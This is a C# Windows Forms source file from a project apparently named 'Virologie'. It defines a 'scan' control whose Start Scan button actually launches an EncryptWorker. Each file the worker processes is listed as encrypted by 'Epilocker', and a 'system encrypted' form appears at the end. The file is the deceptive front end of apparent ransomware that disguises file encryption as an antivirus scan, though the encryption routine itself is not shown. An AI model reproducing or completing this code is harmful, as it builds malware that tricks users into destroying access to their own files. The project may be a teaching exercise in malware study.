using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Virologie
{
    public partial class GroupBoxScan : UserControl
    {
        private readonly EncryptWorker worker;

        private readonly DataTable table;

        public GroupBoxScan()
        {
            InitializeComponent();

            worker = new EncryptWorker();
            worker.RunWorkerCompleted += worker_RunWorkerCompleted;
            worker.ProgressChanged += worker_ProgressChanged;
        }

        void worker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            progressBar1.Value = e.ProgressPercentage;
            int n = dataGridView1.Rows.Add();

            dataGridView1.Rows[n].Cells["VirusName"].Value = "Epilocker";
            dataGridView1.Rows[n].Cells["Severity"].Value = "Maximum";
            dataGridView1.Rows[n].Cells["Status"].Value = "Encrypted";
            dataGridView1.Rows[n].Cells["Description"].Value = worker.CurrentFile;
        }

        void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            if (e.Error != null)
            {
                Console.WriteLine("Error running the scan");
                return;
            }

            progressBar1.Value = 100;
            var seForm = new SystemEncrytedForm();
            seForm.Show();
        }

        private void StartScanButton_Click(object sender, EventArgs e)
        {
            StartScanButton.Enabled = false;
            dataGridView1.Enabled = true;
            worker.RunWorkerAsync();
        }

       protected override void OnPaint(PaintEventArgs e)
       {
           base.OnPaint(e);
           if (DesignMode) this.Visible = false;
       }
    }
}
